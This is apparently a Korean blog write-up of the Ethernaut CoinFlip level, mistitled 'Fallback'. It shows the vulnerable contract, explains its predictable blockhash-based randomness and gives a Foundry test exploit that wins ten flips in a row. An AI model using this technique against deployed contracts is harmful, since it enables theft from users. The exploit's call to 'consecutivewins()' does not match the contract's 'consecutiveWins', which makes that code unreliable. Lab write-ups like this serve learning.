---
title: "Ethernaut Fallback"
date : 2026-11-14 00:00:00 +0900
categories: [Blockchain Security, Ethernaut ]
tags: [solidity, smart-contract, access-control, fallback, foundry]
---

## CoinFLip

CoinFlip 코드 

```solidity

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract CoinFlip {
    uint256 public consecutiveWins;
    uint256 lastHash;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor() {
        consecutiveWins = 0;
    }

    function flip(bool _guess) public returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        /* 현재 블록 번호-1 값의 해시값을 blockValue로 사용 */

        if (lastHash == blockValue) {
            revert();
        }

        lastHash = blockValue;
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        /* 블록해시값을 Factor값이랑 같으면 side에 bool 저장 */

        if (side == _guess) {
            consecutiveWins++;
            return true;
        } else {
            consecutiveWins = 0;
            return false;
        }
    }
}


```

consecutiveWins값을 10으로 만들면된다.

## 분석

block.number를 이용해 해시값을 생성해서 FACTOR로 나누는데 FACTOR값이 2^255값이라 0,1둘중에 하나로만 나온다.

block.number는 같으니 한 반복문에서 blockvalue를 만들어주고 맞는값을 _guess로 넘겨주면된다.

테스트니 vm.roll로 block.number를 업데이트해준다.
실제로는 이더리움이 ~12초마다 블럭을 만들어주니 기다려야한다.

## exploit

``` solidity

pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/CoinFlip.sol";

contract CoinFlip_attack is Test{
    
    CoinFlip coinflip;
    
    function setUp() public{
        coinflip = new CoinFlip();
    }


    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    function test_attack() public{
        vm.startPrank(msg.sender);
        
        for(uint i=0; i<10; i++){
            uint blockvalue = uint256(blockhash(block.number-1));
            console.log("blockvalue : ", blockvalue);
            bool side = blockvalue/FACTOR == 1 ? true : false;
            coinflip.flip(side);
            console.log(block.number);
            vm.roll(block.number+1);
            console.log(block.number);
        }

        assertEq(coinflip.consecutivewins() , 10);
        vm.stopPrank();
    }    
}

 ```